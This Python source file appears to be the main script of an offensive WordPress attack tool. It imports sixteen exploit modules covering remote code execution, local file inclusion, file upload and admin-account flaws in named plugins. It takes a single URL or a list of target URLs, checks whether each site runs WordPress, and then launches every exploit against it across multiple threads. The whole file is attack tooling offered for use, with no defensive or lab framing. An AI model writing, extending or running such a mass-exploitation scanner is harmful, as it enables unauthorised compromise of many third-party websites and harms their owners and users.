try:   
    from scripts import (
        admin_word_wp,
        Blow_fish_RCE,
        check_wordpress,
        cherry_exploit,
        contact_form_upload,
        gravity_exploit,
        Media_lfi,
        pack_lfi,
        PicUpload,
        seo,
        showbiz_exploit,
        simple_file_list,
        tutor_exploit,
        upload_smart,
        video_synchro,
        zomsound_lfi,
        zoomsounds_rce

    )
    import threading
    import queue
    import concurrent.futures
    import argparse
    import os
    import sys
    from help.banner import show_me
    print("All modules has been loded successfully ")
except:
    print("Not all modules imported successfully")


q = queue.Queue()


def DestinationThread():
    while True:
        url = q.get()
        if not (url.startswith('https://') or url.startswith('http://')):
            url = 'http://' + url
        if check_wordpress.is_wordpress(url):
            admin_word_wp.exploit(url)
            Blow_fish_RCE.exploit(url)
            cherry_exploit.exploit(url)
            contact_form_upload.exploit(url)
            gravity_exploit.exploit(url)
            Media_lfi.exploit(url)
            pack_lfi.exploit(url)
            PicUpload.exploit(url)
            seo.exploit(url)
            showbiz_exploit.exploit(url)
            simple_file_list.exploit(url)
            tutor_exploit.exploit(url)
            upload_smart.exploit(url)
            video_synchro.exploit(url)
            zomsound_lfi.exploit(url)
            zoomsounds_rce.exploit(url)
        q.task_done()



def main(file):

    with open(file, 'r') as f:
        for line in f:
            q.put(line.strip())
    
    for i in range(args.threads):
        t = threading.Thread(target=DestinationThread)
        t.daemon = True
        t.start()
    
    q.join()






if __name__ == '__main__':
    def args():
        parser = argparse.ArgumentParser()
        parser.add_argument('-t', '--threads', help='Number of threads', default=10, type=int)
        parser.add_argument('-u', '--url', help='Target url', type=str)
        parser.add_argument('-f', '--file', help='Target file', type=str)
        args = parser.parse_args()
        return args
    
    args = args()

    if args.url:
        show_me()
        if check_wordpress.is_wordpress(args.url):
            admin_word_wp.exploit(args.url)
            Blow_fish_RCE.exploit(args.url)
            cherry_exploit.exploit(args.url)
            contact_form_upload.exploit(args.url)
            gravity_exploit.exploit(args.url)
            Media_lfi.exploit(args.url)
            pack_lfi.exploit(args.url)
            PicUpload.exploit(args.url)
            seo.exploit(args.url)
            showbiz_exploit.exploit(args.url)
            simple_file_list.exploit(args.url)
            tutor_exploit.exploit(args.url)
            upload_smart.exploit(args.url)
            video_synchro.exploit(args.url)
            zomsound_lfi.exploit(args.url)
            zoomsounds_rce.exploit(args.url)
        else:
            print("Not wordpress")
    elif args.file:
        show_me()
        main(args.file)
    else:
        print("Please enter -h for help")




